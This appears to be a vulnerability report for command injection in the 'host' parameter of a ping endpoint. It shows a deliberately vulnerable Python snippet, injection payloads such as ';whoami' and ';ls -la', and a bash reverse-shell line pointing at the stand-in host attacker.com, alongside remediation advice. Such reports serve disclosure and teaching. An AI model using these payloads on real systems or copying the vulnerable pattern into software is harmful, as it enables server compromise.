# üêû Command Injection Vulnerability Report

---

## üìå Title

**Unauthenticated Command Injection via `host` Parameter**

---

## üìù Description

A **Command Injection** vulnerability was identified in the `host` parameter of the application. This allows an attacker to inject arbitrary system-level commands that are executed on the server. The vulnerability exists due to improper input handling in a system call where user input is directly concatenated into an OS command.

---

## üéØ Affected Endpoint

- **URL**: `https://vulnerable-website.com/ping?host=`
- **Method**: `GET`
- **Parameter**: `host`

---

## ‚öôÔ∏è Vulnerable Code Example (Python)

```python
# ‚ùå Vulnerable Implementation
@app.route("/ping")
def ping():
    host = request.args.get("host")
    os.system("ping -c 4 " + host)
```

---

## üß™ Steps to Reproduce

1. Open a browser or proxy tool like Burp Suite.
2. Navigate to the following URL to trigger basic functionality:

```
https://vulnerable-website.com/ping?host=127.0.0.1
```

3. Modify the request to inject a command:

```
https://vulnerable-website.com/ping?host=127.0.0.1;whoami
```

4. Observe the response showing server-side execution output, e.g.,

```
ping output...
www-data
```

‚úÖ This confirms the vulnerability.

### üïµÔ∏è‚Äç‚ôÇÔ∏è List Files

```http
https://vulnerable-website.com/ping?host=127.0.0.1;ls+-la
```

### üì§ Reverse Shell (Linux)

```http
https://vulnerable-website.com/ping?host=127.0.0.1;bash+-c+'bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1'
```

---

## üî• Impact

- Full system compromise
- File system access
- Sensitive file read (e.g., `/etc/passwd`)
- Reverse shell and remote persistence
- Privilege escalation (if service runs as root)
- Lateral movement in internal networks

---

## üîß Recommended Remediation

- **Never** use raw user input in system-level commands.
- Use parameterized functions and secure APIs.
- Validate input strictly using a whitelist.
- Sanitize input to block special characters (`;`, `&`, `|`, etc.).
- Use safe libraries like Python‚Äôs `subprocess.run` with argument lists:

```python
# ‚úÖ Safe Example
subprocess.run(["ping", "-c", "4", host], check=True)
```

- Run services as a non-root user with limited privileges.

---

## üîê Security Best Practices

- Implement strict input validation and sanitization.
- Use allowlists over blocklists for parameters.
- Employ Web Application Firewalls (WAF).
- Regularly audit server logs for suspicious command execution.
- Run automated vulnerability scanners periodically.
